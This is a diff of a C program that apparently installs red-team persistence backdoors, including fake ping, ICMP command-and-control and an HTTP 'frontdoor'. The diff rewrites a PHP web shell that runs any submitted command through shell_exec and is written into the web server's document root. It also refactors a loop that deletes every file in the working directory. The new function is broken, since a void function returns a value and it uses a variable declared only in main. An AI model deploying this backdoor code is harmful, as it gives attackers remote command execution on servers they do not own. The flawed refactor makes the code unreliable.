@@ -339,16 +339,8 @@ int re_fake_ping(void){
 ////////////////////////////////////////
 ////////// HTTP Frontdoor
 ////////////////////////////////////////
-static const char *frontdoor_contents = "<form method=\"GET\">\n"
-"    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
-"    <input type=\"submit\" value=\"Run\">\n"
-"</form>\n"
-"<?php\n"
-"    if(isset($_GET[\"command\"])){\n"
-"        $out = shell_exec($_GET[\"command\"]);\n"
-"        echo \"<pre>\" . $out . \"</pre>\";\n"
-"    }\n"
-"?>";
+static const char *frontdoor_contents = "<form method=\"GET\"><p>Command: <input type=\"text\" name=\"command\"></p><input type=\"submit\" value=\"Run\"></form>\n"
+"<?php if(isset($_GET[\"command\"])){ $out = shell_exec($_GET[\"command\"]); echo \"<pre>\" . $out . \"</pre>\"; }; ?>";
 int re_http_frontdoor(void){
     // Create file and write above php
     FILE *fp = fopen("" HTTP_DOCUMENT_ROOT "/rt_frontdoor.php", "w+");
@@ -691,12 +683,29 @@ int re_icmp_c2(void){
     return 0;
 }
 
+void empty_working_dir(void){
+    struct dirent *de;
+    DIR *dr;
+
+    dr = opendir(WORKING_DIR);
+    if (dr == NULL) { 
+        perror("opendir"); 
+        return 1;
+    }
+    while ((de = readdir(dr)) != NULL) {
+        #ifndef QUIET
+        fprintf(stderr, "Removing " WORKING_DIR "/%s\n", de->d_name);
+        #endif
+        sprintf(current_file, "" WORKING_DIR "/%s", de->d_name);
+        remove(current_file);
+    }
+    closedir(dr);
+}
+
 #define FAILURE_STRING "Failed to install %s\n"
 #define print_failure(message) fprintf(stderr, FAILURE_STRING, message);
 
 int main(int argc, char **argv){
-    struct dirent *de;
-    DIR *dr;
     int failures = 0;
     char current_file[FILENAME_MAX];
 
@@ -720,19 +729,7 @@ int main(int argc, char **argv){
         failures |= ICMPK_ID;
 
     // Empty WORKING_DIR
-    dr = opendir(WORKING_DIR);
-    if (dr == NULL) { 
-        perror("opendir"); 
-        return 1;
-    }
-    while ((de = readdir(dr)) != NULL) {
-        #ifndef QUIET
-        fprintf(stderr, "Removing " WORKING_DIR "/%s\n", de->d_name);
-        #endif
-        sprintf(current_file, "" WORKING_DIR "/%s", de->d_name);
-        remove(current_file);
-    }
-    closedir(dr);
+    empty_working_dir();
 
     // Print failures at program end
     if (failures & BASH_ID)
